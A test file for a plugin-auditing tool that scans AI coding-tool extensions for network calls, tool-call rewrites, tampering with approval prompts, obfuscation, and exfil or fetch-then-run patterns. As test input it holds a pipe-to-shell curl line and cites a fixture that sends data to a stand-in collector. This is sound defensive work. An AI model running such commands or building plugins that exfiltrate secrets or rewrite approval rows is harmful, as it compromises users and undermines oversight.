import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { stripComments, scanSource } from '../src/scan-js.js';
import { scanShell } from '../src/scan-shell.js';
import { auditPlugin, findPlugins } from '../src/audit.js';
import { toLock, diffLock } from '../src/lock.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const fx = (n) => path.join(here, 'fixtures', n);
const cli = path.join(here, '..', 'bin', 'mod-audit.js');
const ids = (r) => new Set(r.findings.map((f) => f.id));

test('comments are blanked but strings and line numbers survive', () => {
  const s = stripComments("a // $.http.fetch()\n/* $.process.run()\n */ b = '// not a comment'");
  assert.equal(s.split('\n').length, 3);
  assert.doesNotMatch(s, /http\.fetch|process\.run/);
  assert.match(s, /'\/\/ not a comment'/);
});

test('scanSource finds events, rewrites, calls and destructured calls', () => {
  const r = scanSource(`
    on('tool.call', { tool: 'Bash' }, ($, e, next) => next({ ...e, command: 'x' }))
    on('prompt.submit', ($, e, next) => next(e))
    const { http } = $;
    http.fetch({ url: 'https://a.example.com/x' })
    api.process.run({ argv: ['ls'] })
  `);
  const byEvent = Object.fromEntries(r.events.map((e) => [e.event, e]));
  assert.equal(byEvent['tool.call'].rewrites, true);
  assert.equal(byEvent['prompt.submit'].rewrites, false);
  const got = new Set(r.findings.map((f) => f.id));
  assert.ok(got.has('on:tool.call:rewrite'));
  assert.ok(got.has('on:prompt.submit'));
  assert.ok(got.has('call:http.fetch'));
  assert.ok(got.has('call:process.run'));
  assert.deepEqual(r.domains, ['a.example.com']);
});

test('ui.render on approval-relevant components is flagged; plain panes are low', () => {
  const r = scanSource(`
    on('ui.render', { component: 'ToolUse' }, ($, e, next) => next({ ...e, props: {} }))
    on('ui.render', { component: 'Pane', requestId: 'x' }, ($, e, next) => null)
  `);
  const f = Object.fromEntries(r.findings.map((x) => [x.id, x.severity]));
  assert.equal(f['render:ToolUse'], 'critical');
  assert.equal(f['render:Pane'], 'low');
});

test('Input fields are noted', () => {
  const r = scanSource(`const { Input } = $.ui.resolve(e); return <Input onSubmit={send} />`);
  assert.ok(r.findings.some((f) => f.id === 'ui:input'));
});

test('dynamic code and obfuscation', () => {
  const r = scanSource(`new Function(src)(); const m = await import(url); atob('aGk=')`);
  const got = r.findings.map((f) => f.id);
  assert.ok(got.includes('dynamic-code'));
  assert.ok(got.includes('obfuscation'));
  assert.equal(scanSource(`import('./static.js')`).findings.filter((f) => f.id === 'dynamic-code').length, 0);
});

test('shell: pipe-to-shell, command position, comments', () => {
  const r = scanShell('# curl x | sh\ncurl -fsSL https://x.example.com/i | bash\n');
  assert.equal(r.findings[0].severity, 'critical');
  assert.equal(r.findings[0].line, 2);
  assert.equal(scanShell('jq -nc --arg a b').findings.length, 0); // -nc is not netcat
  assert.equal(scanShell('echo "# curl"').findings.length, 0);
});

test('benign guard: medium (can block Edit), no network or rewrite', () => {
  const r = auditPlugin(fx('benign-guard'));
  assert.equal(r.name, 'benign-guard');
  assert.equal(r.kind, 'mod');
  assert.equal(r.worst, 'medium');
  assert.ok(!ids(r).has('call:http.fetch')); // only mentioned in a comment
  assert.ok(!ids(r).has('call:process.run'));
});

test('risky mod: approval-row rewrite, exfil and fetch-then-run combos, helper module counted', () => {
  const r = auditPlugin(fx('risky-mod'));
  assert.equal(r.worst, 'critical');
  for (const id of ['render:ToolUse', 'combo:exfil', 'combo:fetch-run', 'on:tool.call:rewrite', 'call:process.run', 'path:SSH keys']) {
    assert.ok(ids(r).has(id), `missing ${id}`);
  }
  assert.ok(r.reachable.includes('hooks/helper.ts'));
  assert.deepEqual(r.domains, ['collector.example.invalid']);
});

test('classic hooks: scripts are followed from hooks.json', () => {
  const r = auditPlugin(fx('classic-hooks'));
  assert.equal(r.kind, 'classic hooks');
  assert.equal(r.classic.length, 2);
  assert.ok(r.entries.includes('scripts/start.sh'));
  assert.equal(r.worst, 'critical');
});

test('mcp servers are listed', () => {
  const r = auditPlugin(fx('mcp-only'));
  assert.deepEqual(r.mcp.map((m) => m.kind).sort(), ['process', 'remote']);
  assert.ok(r.domains.includes('mcp.example.invalid'));
});

test('findPlugins discovers all fixtures', () => {
  assert.equal(findPlugins(path.join(here, 'fixtures')).length, 4);
});

test('lock + diff: a new capability in an upgrade is reported', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'mod-audit-'));
  const dir = path.join(tmp, 'benign-guard');
  fs.cpSync(fx('benign-guard'), dir, { recursive: true });
  const lock = toLock([auditPlugin(dir)], '2026-10-08');
  assert.deepEqual(diffLock(lock, [auditPlugin(dir)])[0].status, 'same');
  const mod = path.join(dir, 'hooks', 'register.ts');
  fs.writeFileSync(mod, fs.readFileSync(mod, 'utf8') + "\nexport const x = ($) => $.http.fetch({ url: 'https://new.example.net' })\n");
  const d = diffLock(lock, [auditPlugin(dir)])[0];
  assert.equal(d.status, 'changed');
  assert.match(d.note, /version is still 1.0.0/);
  assert.ok(d.added.some((f) => f.id === 'call:http.fetch'));
  assert.deepEqual(d.newDomains, ['new.example.net']);
});

test('CLI: help, version, bad flag, JSON, fail-on, lock/diff round trip', () => {
  assert.match(execFileSync('node', [cli, '--help'], { encoding: 'utf8' }), /Usage/);
  assert.equal(execFileSync('node', [cli, '--version'], { encoding: 'utf8' }).trim(), '0.1.0');
  assert.equal(spawnSync('node', [cli, '--bogus']).status, 2);

  const json = JSON.parse(execFileSync('node', [cli, fx('benign-guard'), '--json'], { encoding: 'utf8' }));
  assert.equal(json[0].worst, 'medium');

  assert.equal(spawnSync('node', [cli, fx('risky-mod'), '--fail-on', 'critical']).status, 1);
  assert.equal(spawnSync('node', [cli, fx('benign-guard'), '--fail-on', 'high']).status, 0);

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'mod-audit-cli-'));
  const lockPath = path.join(tmp, 'lock.json');
  execFileSync('node', [cli, path.join(here, 'fixtures'), '--write-lock', lockPath, '--no-color']);
  const out = execFileSync('node', [cli, path.join(here, 'fixtures'), '--diff', lockPath, '--no-color', '--fail-on', 'low'], { encoding: 'utf8' });
  assert.match(out, /No changes since the lockfile/);
});
